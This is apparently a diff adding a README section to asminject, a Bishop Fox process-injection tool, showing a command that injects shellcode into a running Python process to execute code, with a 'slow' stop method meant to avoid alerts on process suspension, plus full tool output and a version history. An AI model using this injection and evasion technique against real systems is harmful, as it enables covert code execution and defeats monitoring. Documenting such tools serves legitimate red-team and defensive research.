@@ -229,3 +229,71 @@ Meterpreter  : x64/linux
 
 ```
 
+## Example 3: Using "slow" mode to help avoid triggerinng alerts related to process suspension
+
+```
+# python3 ./asminject.py 1469974 asm/x86-64/execute_python_code-01.s --relative-offsets relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false
+
+                     .__            __               __
+  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
+ / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
+/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
+\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
+        \/                   \/\______|    \/     \/     \/|__|   \/
+
+asminject.py
+v0.2
+Ben Lincoln, Bishop Fox, 2021-08-30
+https://github.com/BishopFox/asminject
+based on dlinject, which is Copyright (c) 2019 David Buchanan
+dlinject source: https://github.com/DavidBuchanan314/dlinject
+
+[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
+[*] Current process priority for asminject.py (PID: 1469992) is 0
+[*] Current CPU affinity for asminject.py (PID: 1469992) is [0, 1]
+[*] Current process priority for target process (PID: 1469974) is 0
+[*] Current CPU affinity for target process (PID: 1469974) is [0, 1]
+[*] Setting process priority for asminject.py (PID: 1469992) to -20
+[*] Setting process priority for target process (PID: 1469974) to 20
+[*] Setting CPU affinity for target process (PID: 1469974) to [0, 1]
+[*] RIP: 0x7f0413f7ae8e
+[*] RSP: 0x7ffef9f13298
+[*] /usr/bin/python2.7: 0x000055de1cd68000
+[*] /usr/lib/locale/locale-archive: 0x00007f0413a2f000
+[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007f0414205000
+[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007f0413e8c000
+[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007f04141b7000
+[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007f0414051000
+[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007f04141bd000
+[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007f04141b2000
+[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007f0414195000
+[*] 0: 0x000055de1d0de000
+[*] [heap]: 0x000055de1daba000
+[*] [stack]: 0x00007ffef9ef5000
+[*] [vdso]: 0x00007ffef9ff0000
+[*] [vvar]: 0x00007ffef9fec000
+[*] Writing assembled binary to /tmp/tmpbcnmp9ua.o
+[*] Wrote first stage shellcode
+[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
+[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
+[*] Writing assembled binary to /tmp/tmp6gp52soz.o
+[*] Wrote stage 2 to '/tmp/tmppys_olae'
+[*] Returning to normal time...
+[*] Setting process priority for asminject.py (PID: 1469992) to 0
+[*] Setting process priority for target process (PID: 1469974) to 0
+[*] Setting CPU affinity for target process (PID: 1469974) to [0, 1]
+[+] Done!
+```
+
+### Version history
+
+#### 0.2 (2021-08-30)
+
+- Still an internal development build
+- Implemented "slow" stop method
+- Implemented support for PIC binaries, like Python 3.x
+- Various bug fixes
+
+#### 0.1 (2021-06-07)
+
+Internal development build
